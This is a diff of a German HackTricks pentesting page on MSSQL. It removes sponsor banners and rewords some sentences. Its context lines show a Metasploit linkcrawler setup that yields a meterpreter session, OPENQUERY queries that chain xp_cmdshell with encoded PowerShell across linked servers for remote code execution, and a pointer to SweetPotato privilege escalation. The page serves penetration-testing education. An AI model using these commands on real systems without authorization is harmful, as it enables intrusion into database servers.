@@ -2,9 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## **MSSQL Enumeration / Entdeckung**
 
@@ -205,7 +202,7 @@ Sie können vertrauenswürdige Links einfach mit Metasploit überprüfen.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Beachten Sie, dass Metasploit nur versuchen wird, die `openquery()`-Funktion in MSSQL auszunutzen (wenn Sie also keinen Befehl mit `openquery()` ausführen können, müssen Sie die `EXECUTE`-Methode **manuell** ausprobieren, um Befehle auszuführen, siehe mehr dazu unten.)
+Beachten Sie, dass Metasploit nur versuchen wird, die Funktion `openquery()` in MSSQL auszunutzen (wenn Sie also keinen Befehl mit `openquery()` ausführen können, müssen Sie die `EXECUTE`-Methode **manuell** ausprobieren, um Befehle auszuführen, siehe mehr unten.)
 
 ### Manuell - Openquery()
 
@@ -231,7 +228,7 @@ Führen Sie Abfragen über den Link aus (Beispiel: Finden Sie weitere Links in d
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Überprüfen Sie, wo doppelte und einfache Anführungszeichen verwendet werden, es ist wichtig, sie auf diese Weise zu verwenden.
+> Überprüfen Sie, wo doppelte und einfache Anführungszeichen verwendet werden. Es ist wichtig, sie auf diese Weise zu verwenden.
 
 ![](<../../images/image (643).png>)
 
@@ -243,7 +240,7 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Wenn Sie keine Aktionen wie `exec xp_cmdshell` von `openquery()` ausführen können, versuchen Sie es mit der `EXECUTE`-Methode.
+Wenn Sie Aktionen wie `exec xp_cmdshell` aus `openquery()` nicht ausführen können, versuchen Sie es mit der `EXECUTE`-Methode.
 
 ### Manuell - EXECUTE
 
@@ -261,8 +258,5 @@ Eine Strategie, die viele Autoren entwickelt haben, besteht darin, einen SYSTEM-
 
 [SweetPotato](https://github.com/CCob/SweetPotato) hat eine Sammlung dieser verschiedenen Techniken, die über den `execute-assembly` Befehl von Beacon ausgeführt werden können.
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
